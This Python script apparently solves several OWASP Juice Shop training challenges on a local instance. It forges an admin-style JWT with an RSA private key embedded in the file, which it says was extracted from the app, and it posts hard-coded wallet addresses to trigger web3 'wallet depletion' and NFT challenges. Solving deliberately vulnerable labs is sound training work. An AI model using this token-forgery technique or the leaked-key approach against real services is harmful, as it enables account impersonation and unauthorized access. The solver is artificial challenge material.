import json
import time
import requests
import jwt

# --- CONFIGURATION ---
BASE_URL = "http://localhost:3000"

# --- CONSTANTS & KEYS ---
# Extracted from build/lib/insecurity.js
RSA_PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8iMz0EaM4BKUqYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exou/F+WTISzbQ5FBVPVmhnYhG/kpwt/cIxK5iUn5hm+4tQIDAQABAoGBAI+8xiPoOrA+KMnG/T4jJsG6TsHQcDHvJi7o1IKC/hnIXha0atTX5AUkRRce95qSfvKFweXdJXSQ0JMGJyfuXgU6dI0TcseFRfewXAa/ssxAC+iUVR6KUMh1PE2wXLitfeI6JLvVtrBYswm2I7CtY0q8n5AGimHWVXJPLfGV7m0BAkEA+fqFt2LXbLtyg6wZyxMA/cnmt5Nt3U2dAu77MzFJvibANUNHE4HPLZxjGNXN+a6m0K6TD4kDdh5HfUYLWWRBYQJBANK3carmulBwqzcDBjsJ0YrIONBpCAsXxk8idXb8jL9aNIg15Wumm2enqqObahDHB5jnGOLmbasizvSVqypfM9UCQCQl8xIqy+YgURXzXCN+kwUgHinrutZms87Jyi+D8Br8NY0+Nlf+zHvXAomD2W5CsEK7C+8SLBr3k/TsnRWHJuECQHFE9RA2OP8WoaLPuGCyFXaxzICThSRZYluVnWkZtxsBhW2W8z1b8PvWUE7kMy7TnkzeJS2LSnaNHoyxi7IaPQUCQCwWU4U+v4lD7uYBw00Ga/xt+7+UqFPlPVdz1yyr4q24Zxaw0LgmuEvgU5dycq8N7JxjTubX0MIRR+G9fmDBBl8=
-----END RSA PRIVATE KEY-----"""

WALLET_EXPLOIT_ADDRESS = "0x3692B35006917B545B50d2a4757f5F272cd48ADe"
NFT_MINT_ADDRESS = "0x8343d2eb2B13A2495De435a1b15e85b98115Ce05"

def solve_forged_signed_jwt():
    print("[*] Attempting Forged Signed JWT...")
    # Forge the token using RS256 algorithm but signed with the private key
    # The server validation logic has a flaw where it accepts tokens if they are valid RS256 signatures
    # OR if we exploit the key confusion (HS256 with public key).
    #
    # Wait, the previous working solution used RS256 with the PRIVATE key.
    # Let's stick to what just worked:
    # token = jwt.encode(payload, PRIVATE_KEY, algorithm="RS256")
    
    payload = {
        "email": "rsa_lord@juice-sh.op",
        "data": {
            "id": 999,
            "email": "rsa_lord@juice-sh.op",
            "isAdmin": False,
            "deletedAt": None
        },
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600
    }
    
    token = jwt.encode(payload, RSA_PRIVATE_KEY, algorithm="RS256")
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Cookie": f"token={token}"
    }
    
    try:
        resp = requests.get(f"{BASE_URL}/rest/user/whoami", headers=headers, timeout=10)
        resp.raise_for_status()
        print(f"    [+] Success! Whoami response: {resp.text}")
    except Exception as e:
        print(f"    [-] Failed: {e}")

def solve_wallet_depletion():
    print("[*] Attempting Wallet Depletion...")
    url = f"{BASE_URL}/rest/web3/walletExploitAddress"
    payload = {"walletAddress": WALLET_EXPLOIT_ADDRESS}
    headers = {"Content-Type": "application/json"}
    max_attempts = 20
    sleep_seconds = 3

    for attempt in range(1, max_attempts + 1):
        try:
            resp = requests.post(url, json=payload, headers=headers, timeout=10)
            resp.raise_for_status()
            try:
                data = resp.json()
                message = data.get("message") or data.get("status") or resp.text
            except ValueError:
                message = resp.text
            message_str = message if isinstance(message, str) else str(message)

            print(f"    [+] Attempt {attempt}: {message_str}")

            if message_str == "Event Listener Created":
                print("    [-] Listener created but not solved yet (likely). Retrying...")
                if attempt < max_attempts:
                    time.sleep(sleep_seconds)
                continue

            if "no exploit detected" in message_str.lower():
                print("    [-] No exploit detected yet. Retrying...")
                if attempt < max_attempts:
                    time.sleep(sleep_seconds)
                continue

            if "success" in message_str.lower() or "solved" in message_str.lower() or "completed" in message_str.lower():
                break
        except Exception as e:
            print(f"    [-] Attempt {attempt} failed: {e}")
        if attempt < max_attempts:
            time.sleep(sleep_seconds)

def solve_nft_mint():
    print("[*] Attempting NFT Mint (Honey Pot)...")
    url = f"{BASE_URL}/rest/web3/walletNFTVerify"
    payload = {"walletAddress": NFT_MINT_ADDRESS}
    headers = {"Content-Type": "application/json"}
    
    for attempt in range(1, 11):
        try:
            resp = requests.post(url, json=payload, headers=headers, timeout=10)
            resp.raise_for_status()
            try:
                data = resp.json()
                message = data.get("message") or data.get("status") or resp.text
            except ValueError:
                message = resp.text
            message_str = message if isinstance(message, str) else str(message)

            print(f"    [+] Attempt {attempt}: {message_str}")

            if message_str == "Event Listener Created":
                print("    [-] Listener created but not solved yet (likely). Retrying...")
                if attempt < 10:
                    time.sleep(2)
                continue

            if "success" in message_str.lower() or "solved" in message_str.lower() or "completed" in message_str.lower():
                break
        except Exception as e:
            print(f"    [-] Attempt {attempt} failed: {e}")
        if attempt < 10:
            time.sleep(2)

if __name__ == "__main__":
    print("=== FRONTIER CHALLENGES SOLUTION SCRIPT ===")
    solve_forged_signed_jwt()
    solve_wallet_depletion()
    solve_nft_mint()
